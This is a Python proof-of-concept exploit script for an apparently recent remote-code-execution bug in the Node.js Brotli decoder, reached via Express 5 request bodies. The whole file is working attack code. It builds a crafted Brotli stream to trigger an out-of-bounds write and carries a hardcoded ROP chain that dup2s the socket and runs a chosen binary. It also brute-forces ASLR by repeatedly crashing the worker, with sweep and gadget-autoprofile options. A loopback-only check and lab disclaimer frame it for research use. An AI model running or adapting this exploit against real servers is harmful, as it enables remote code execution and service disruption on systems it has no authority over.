#!/usr/bin/env python3
"""node2shell: CVE-2026-111497 proof-of-concept (authorized lab use only).

Reproduces remote code execution against the vulnerable Node.js Brotli decoder
(node 24.22.0) through Express 5 / body-parser 2.x, which transparently decode
`Content-Encoding: br` request bodies. A crafted stream drives the decoder's
impossible distance-block switch into an invalid state, yielding a controlled
16-byte out-of-bounds write (decode.c memmove16, copy_dst = ring + pos, pos as a
signed displacement). The write redirects a saved return address into a ROP
chain that dup2()s the request socket and execvp("/usr/bin/id"), so `id` output
returns on the attacker's own connection.

The write destination depends on the process's ASLR layout, which the bug does
NOT let us leak ahead of time (the only in-stream read primitive discloses a few
bytes of ring slack). So the PoC is PROBABILISTIC: it fires a fixed-offset guess
and crash-resets the worker between attempts (the supervisor restarts it with a
fresh layout) until the guess matches. This matches Imperva's "several attempts"
result; see README for why a deterministic single-shot is not achievable here.

Loopback-only by construction. Point it only at a lab container you own.
"""
import argparse
import hashlib
import os
import re
import socket
import struct
import sys
import time

TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"
ALLOWED_TARGET_HOSTS = frozenset({"127.0.0.1", "::1", "localhost"})
ID_OUTPUT = re.compile(r"uid=\d+\(.+\) gid=\d+\(.+\) groups=\d+\(.+\)")

# ROP profile for the pinned node 24.22.0 x86-64 binary (sha256 67ca5783...),
# as published with the public PoC; gadgets apply verbatim to that build.
PROFILE = {
    "prefix_size": 1031,
    "copy_source_offset": 0x367,
    "command_block_extra": 0xFFFFFF,
    "second_stage_size": 256,
    "stage_delay_seconds": 0.5,
    "restart_timeout_seconds": 8.0,
    "attempts": 32,
    "default_staged_position": 0x137ED748,  # ring->saved-ret 0x137eaf48 + 0x2800 wrap
    "accepted_socket_fd": 19,
    "mov_rax_rdi_ret": 0x816750,
    "pivot_rsp_rax_30_ret": 0x1FB97F8,
    "pop_rsi_ret": 0x8A604E,
    "store_rdi_plus_88_ret": 0x8BD991,
    "pop_rbx_ret": 0x7F6143,
    "pop_rdi_ret": 0x94FE4D,
    "dup2_plt": 0x74D7F0,
    "execvp_call_site": 0x1A3EBEC,
    "bss_base": 0x6BDFB00,
}

VERBOSE = True

# ---- colour + banner + progress bar ---------------------------------------
_TTY = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


def _c(seq: str) -> str:
    return seq if _TTY else ""


R    = _c("\033[0m")
BOLD = _c("\033[1m")
DIM  = _c("\033[2m")
RED  = _c("\033[38;5;196m")
BRED = _c("\033[1;38;5;196m")
GRN  = _c("\033[1;38;5;46m")
CYA  = _c("\033[38;5;75m")

_BANNER = r"""
███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
████╗  ██║██╔═══██╗██╔══██╗██╔════╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
██╔██╗ ██║██║   ██║██║  ██║█████╗   █████╔╝███████╗███████║█████╗  ██║     ██║
██║╚██╗██║██║   ██║██║  ██║██╔══╝  ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
██║ ╚████║╚██████╔╝██████╔╝███████╗███████╗███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
"""
_GRAD = ["\033[38;5;196m", "\033[38;5;202m", "\033[38;5;208m",
         "\033[38;5;208m", "\033[38;5;202m", "\033[38;5;196m"]


def banner() -> None:
    if not VERBOSE:
        return
    for i, line in enumerate(_BANNER.strip("\n").splitlines()):
        print(f"{_c(_GRAD[i % len(_GRAD)])}{line}{R}")
    print(f"  {BOLD}CVE-2026-111497{R}{DIM}   Brotli-decoder RCE   ·   authorized lab only{R}\n")


def pbar(done: int, total: int, label: str = "") -> None:
    """Red, in-place progress bar; fills to 100% when the write lands."""
    if not (VERBOSE and _TTY):
        return
    frac = min(1.0, done / total) if total else 0.0
    width = 28
    fill = int(round(frac * width))
    bar = BRED + "█" * fill + DIM + "░" * (width - fill) + R
    sys.stdout.write(
        f"\r  {RED}exploiting{R} ▕{bar}▏ {BRED}{int(frac * 100):3d}%{R}  {DIM}{label}{R}\033[K")
    sys.stdout.flush()


def say(msg: str = "") -> None:
    if VERBOSE:
        print(msg, flush=True)


class Bits:
    """Least-significant-bit-first writer for Brotli stream fields."""

    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value: bytes) -> None:
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits: Bits, alphabet_size: int, symbol: int) -> None:
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits: Bits, value: int) -> None:
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def build_stream(prefix: bytes = b"", command_block_extra: int = 0xFFFFFF) -> bytes:
    """Build the trigger stream. With no prefix it is the bare DoS/crash trigger
    (SHA-pinned); with a prefix it carries that prefix verbatim in a leading
    uncompressed metablock (the ROP data the OOB write copies from)."""
    if len(prefix) > 0x10000:
        raise ValueError("prefix is too large")
    if not 0 <= command_block_extra <= 0xFFFFFF:
        raise ValueError("command block extra must fit in 24 bits")
    bits = Bits()
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)  # WBITS = 10 -> 1 KiB window/ring
    if prefix:
        bits.put(0, 1)   # ISLAST = 0
        bits.put(0, 2)   # MNIBBLES code 0 -> 16-bit length
        bits.put(len(prefix) - 1, 16)
        bits.put(1, 1)   # ISUNCOMPRESSED = 1
        if bits.used:
            bits.put(0, 8 - bits.used)
        bits.aligned(prefix)
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)  # MLEN = 2^24
    bits.put(0, 1)
    varlen_u8(bits, 0)  # NBLTYPESL = 1
    varlen_u8(bits, 1)  # NBLTYPESI = 2 -> IC type/len trees follow
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    bits.put(command_block_extra, 24)  # IC initial block count
    varlen_u8(bits, 0)  # NBLTYPESD = 1 -> impossible distance switch, garbage trees
    bits.put(3, 6)  # NPOSTFIX=3, NDIRECT=0 -> dist alphabet 400
    bits.put(0, 2)
    varlen_u8(bits, 0)  # NTREESL = 1
    varlen_u8(bits, 0)  # NTREESD = 1
    one_symbol_tree(bits, 256, 0)    # literal tree
    one_symbol_tree(bits, 704, 130)  # IC tree x2 (nbt=2)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)  # dist tree
    distance_extra = (len(prefix) + 32) // 8
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1
    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)
    return bits.finish()


def stage_two(pos: int, size: int = PROFILE["second_stage_size"]) -> bytes:
    """Second write: resumes the parked decoder and drives the corrupted pos."""
    if size < 27:
        raise ValueError("stage two must be at least 27 bytes")
    body = bytearray(size)
    body[7] = 8
    struct.pack_into("<i", body, 15, pos)
    struct.pack_into("<I", body, 19, 0x7FFFFFFF)
    struct.pack_into("<I", body, 23, 0x7FFFFFFF)
    return bytes(body)


def trigger_stages() -> tuple[bytes, bytes]:
    """The bare crash trigger used to reset the worker between attempts."""
    trigger = build_stream()
    digest = hashlib.sha256(trigger).hexdigest()
    if digest != TRIGGER_SHA256:
        raise RuntimeError(f"trigger hash mismatch: {digest}")
    return trigger + b"\x00" * 3, stage_two(0x7FFFFFFF)


def rce_stages(position: int, socket_fd: int,
               exec_path: str = "/usr/bin/id") -> tuple[bytes, bytes]:
    """Build the two writes that run exec_path and return its stdout on the socket."""
    prefix = bytearray(PROFILE["prefix_size"])
    source = PROFILE["copy_source_offset"]
    struct.pack_into("<QQ", prefix, source,
                     PROFILE["mov_rax_rdi_ret"], PROFILE["pivot_rsp_rax_30_ret"])
    bss = PROFILE["bss_base"]
    chain = (
        PROFILE["pop_rsi_ret"], bss + 8,
        PROFILE["store_rdi_plus_88_ret"],
        PROFILE["pop_rbx_ret"], bss,
        PROFILE["pop_rdi_ret"], socket_fd,
        PROFILE["pop_rsi_ret"], 1,
        PROFILE["dup2_plt"],
        PROFILE["execvp_call_site"],
    )
    struct.pack_into("<" + "Q" * len(chain), prefix, source + 0x30, *chain)
    path = exec_path.encode() + b"\0"
    path_offset = source + 0x88
    budget = len(prefix) - path_offset - 1
    if len(path) > budget + 1:
        raise RuntimeError(
            f"exec path too long ({len(path) - 1} > {budget} bytes). This chain "
            "controls execvp's filename, not argv, so it runs a single binary by "
            "path with no arguments.")
    prefix[path_offset:path_offset + len(path)] = path
    first = build_stream(bytes(prefix), PROFILE["command_block_extra"]) + b"\x00" * 3
    return first, stage_two(position)


def resolve_loopback(host: str, port: int):
    normalized = host.lower()
    if normalized not in ALLOWED_TARGET_HOSTS:
        raise RuntimeError(f"target host must be loopback: {sorted(ALLOWED_TARGET_HOSTS)}")
    targets = socket.getaddrinfo(normalized, port, type=socket.SOCK_STREAM)
    if not targets:
        raise RuntimeError("no target addresses resolved")
    return targets


def connect_target(targets, timeout: float):
    last_error: Exception | None = None
    for family, kind, proto, _canon, address in targets:
        try:
            connection = socket.socket(family, kind, proto)
            connection.settimeout(timeout)
            connection.connect(address)
            return connection
        except OSError as error:
            last_error = error
    raise last_error if last_error else RuntimeError("connect failed")


def receive_http(connection: socket.socket, limit: int = 16384) -> bytes:
    data = bytearray()
    try:
        while len(data) < limit:
            part = connection.recv(min(4096, limit - len(data)))
            if not part:
                break
            data.extend(part)
    except OSError:
        pass
    return bytes(data)


def chunk(data: bytes) -> bytes:
    return f"{len(data):x}\r\n".encode("ascii") + data + b"\r\n"


def _build_headers(path: str, ctype: str) -> bytes:
    return (
        f"POST {path} HTTP/1.1\r\nHost: lab\r\n".encode()
        + f"Content-Type: {ctype}\r\nContent-Encoding: br\r\n".encode()
        + b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
    )


# default target = the Orbital bulk-import route; override with --path/--ctype
_HEADERS = _build_headers("/api/v1/import", "application/json")


def send_two_write(targets, timeout: float, first: bytes, second: bytes,
                   delay: float) -> bytes:
    with connect_target(targets, timeout) as connection:
        connection.sendall(_HEADERS + chunk(first))
        time.sleep(delay)
        try:
            connection.sendall(chunk(second) + b"0\r\n\r\n")
        except OSError:
            return b""
        return receive_http(connection)


def http_healthcheck(targets, timeout: float) -> bool:
    try:
        with connect_target(targets, timeout) as connection:
            connection.sendall(b"GET /health HTTP/1.1\r\nHost: lab\r\nConnection: close\r\n\r\n")
            response = receive_http(connection)
            return response.startswith(b"HTTP/1.1 200") and b"PONG" in response
    except OSError:
        return False


def wait_healthy(targets, timeout: float, deadline_seconds: float) -> bool:
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        if http_healthcheck(targets, min(timeout, 1.0)):
            return True
        time.sleep(0.1)
    return False


def wait_unhealthy(targets, timeout: float, deadline_seconds: float) -> bool:
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        if not http_healthcheck(targets, min(timeout, 0.5)):
            return True
        time.sleep(0.05)
    return False


def crash_reset(targets, timeout: float) -> bool:
    """Crash the worker so the supervisor restarts it with a fresh ASLR layout."""
    first, second = trigger_stages()
    try:
        send_two_write(targets, timeout, first, second, 0.3)
    except OSError:
        pass
    return wait_unhealthy(targets, timeout, 3.0)


def attempt_rce(targets, timeout: float, position: int, socket_fd: int,
                exec_path: str = "/usr/bin/id"):
    first, second = rce_stages(position, socket_fd, exec_path)
    response = send_two_write(targets, timeout, first, second, PROFILE["stage_delay_seconds"])
    # on RCE the node process is replaced by exec_path, so the socket carries the
    # command's raw stdout. on a miss we get an HTTP error (worker alive) or an
    # empty read (worker crashed) -- either way, not command output.
    if not response or response[:5] == b"HTTP/":
        return None
    out = response.decode("utf-8", errors="replace").strip()
    return out or None


def narrate_primitives(position: int, fd: int, exec_path: str) -> None:
    """Print what the exploit builds and why, before firing."""
    trigger = build_stream()
    say("[*] Building exploit primitives")
    say(f"    trigger stream : {len(trigger):,} bytes  (SHA-256 "
        f"{TRIGGER_SHA256[:12]}... verified)")
    say("                     WBITS=10 -> 1 KiB Brotli ring buffer; an impossible")
    say("                     distance-block switch makes the vulnerable decoder")
    say("                     keep decoding in an invalid state.")
    say(f"    ROP prefix     : {PROFILE['prefix_size']} bytes, carried verbatim in a leading")
    say("                     uncompressed metablock (the bytes the OOB write copies):")
    say("                       stack pivot  mov rax,rdi ; lea rsp,[rax+0x30]")
    say(f"                       dup2(socket fd={fd}, 1)   -> stdout returns on our socket")
    say(f'                       execvp("{exec_path}")')
    say(f"    stage 2        : {PROFILE['second_stage_size']} bytes; resumes the parked decoder and")
    say(f"                     drives the corrupted write position {position:#x}")
    say("[*] Write primitive: memmove16(ring + pos, ...) -- a controlled 16-byte")
    say("    out-of-bounds write. pos is a signed displacement from the Brotli ring.")
    say("[*] Delivery: a two-write chunked POST. Write 1 (the trigger) parks the")
    say("    decoder; after a short gap, write 2 resumes it and triggers the write.")
    say("[*] ASLR: ring+pos is an absolute, randomized address and this bug offers no")
    say("    way to leak it first, so we fire a FIXED guess and crash-reset the worker")
    say("    (fresh layout) between misses until the guess matches -- probabilistic,")
    say("    exactly as Imperva reported ('did not succeed on every attempt').")
    say()


def main() -> int:
    global VERBOSE
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=3000)
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("--attempts", type=int, default=PROFILE["attempts"])
    parser.add_argument("--position", type=lambda v: int(v, 0), default=None,
                        help="staged write position (default profile 0x137ed748)")
    parser.add_argument("--fd", type=int, default=PROFILE["accepted_socket_fd"],
                        help="accepted socket fd for dup2 (default 19)")
    parser.add_argument("--sweep", action="store_true",
                        help="sweep positions around the profile delta and fds 17..21")
    parser.add_argument("--autoprofile", metavar="NODE|IMAGE", default=None,
                        help="resolve the ROP gadget profile from a node binary or "
                             "docker image (non-PIE), instead of the built-in profile")
    parser.add_argument("--path", default="/api/v1/import",
                        help="target route the body is POSTed to (default the bulk-import route)")
    parser.add_argument("--ctype", default="application/json",
                        help="Content-Type header (default application/json)")
    parser.add_argument("--exec", default="/usr/bin/id",
                        help="binary to run on the target, by absolute path, no args "
                             "(default /usr/bin/id). The chain controls execvp's "
                             "filename only, so a single binary -- e.g. /usr/bin/whoami, "
                             "/bin/hostname. <=23 bytes.")
    parser.add_argument("--quiet", action="store_true", help="only print the result")
    args = parser.parse_args()
    VERBOSE = not args.quiet
    global _HEADERS
    _HEADERS = _build_headers(args.path, args.ctype)

    if args.autoprofile:
        from build_profile import build_profile  # lazy: needs pwntools
        say(f"[*] Auto-building gadget profile from: {args.autoprofile}")
        PROFILE.update(build_profile(args.autoprofile, verbose=VERBOSE))
        say()

    banner()
    say(f"[*] Target: http://{args.host}:{args.port}  POST {args.path}  "
        f"(Content-Encoding: br -> Express 5 / body-parser 2.x)")

    targets = resolve_loopback(args.host, args.port)
    say("[*] Health check (GET /health) ...")
    if not wait_healthy(targets, args.timeout, 10.0):
        print("[-] FAIL: target is not healthy (GET /health)")
        return 2
    say("    target is up.")
    say()

    base = args.position or PROFILE["default_staged_position"]
    narrate_primitives(base, args.fd, args.exec)

    plan: list[tuple[int, int]] = []
    if args.sweep:
        for fd in (args.fd, 17, 18, 20, 21):
            for delta in (0, -0x8000, 0x8000, -0x20000, 0x20000, -0x80000, 0x80000, -0x9F0000):
                plan.append((base + delta, fd))
        per = 2
        say(f"[*] sweep: {len(plan)} (position, fd) combos, {per} tries each")
    else:
        plan.append((base, args.fd))
        per = args.attempts
        say(f"[*] firing up to {per} attempts at pos={base:#x} fd={args.fd}")
    say()

    total = len(plan) * per
    attempt = 0
    for position, fd in plan:
        for _ in range(per):
            attempt += 1
            if not wait_healthy(targets, args.timeout, PROFILE["restart_timeout_seconds"]):
                if VERBOSE and _TTY:
                    print()
                print(f"{BRED}[-] FAIL: lab did not become healthy before attempt {attempt}{R}")
                return 2
            pbar(attempt - 1, total, f"attempt {attempt}/{total}  pos={position:#x} fd={fd}")
            identity = attempt_rce(targets, args.timeout, position, fd, args.exec)
            if identity:
                pbar(total, total, f"saved-RIP overwritten -> ROP -> execvp({args.exec})")
                if VERBOSE and _TTY:
                    print("\n")
                print(f"{GRN}[+] RCE CONFIRMED{R}  {DIM}(100%, after {attempt} attempt(s)){R}")
                print(f"    {DIM}`{args.exec}` ran on the target; stdout on the exploit socket:{R}")
                for ln in (identity.splitlines() or [identity]):
                    print(f"        {BRED}{ln}{R}")
                print(f"    {DIM}pos={position:#x} fd={fd}{R}")
                return 0
            crash_reset(targets, args.timeout)
    if VERBOSE and _TTY:
        print()
    print(f"{BRED}[-] FAIL: RCE did not land in {attempt} attempts"
          f"{R}  (re-run; it's probabilistic, or try --sweep)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
